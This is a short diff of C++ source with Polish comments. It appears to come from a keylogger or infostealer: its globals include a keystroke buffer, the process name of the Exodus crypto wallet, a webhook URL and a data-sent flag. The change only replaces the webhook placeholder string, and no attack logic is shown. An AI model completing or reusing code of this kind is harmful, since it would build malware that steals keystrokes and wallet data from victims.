@@ -152,7 +152,7 @@ mz_bool mz_zip_writer_end(mz_zip_archive *pZip);
 // --- Zmienne globalne ---
 std::string g_keystrokeBuffer = "";
 const std::wstring g_exodusProcessName = L"Exodus.exe";
-const std::string g_webhookUrl = "WEBHOOK WEBHOOK WEBHOOK ";
+const std::string g_webhookUrl = "-------------->>>>>>>>>WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK<<<<<<<<----------------- ";
 bool g_dataSent = false;
 
 // --- Globalny mutex i funkcja logowania ---
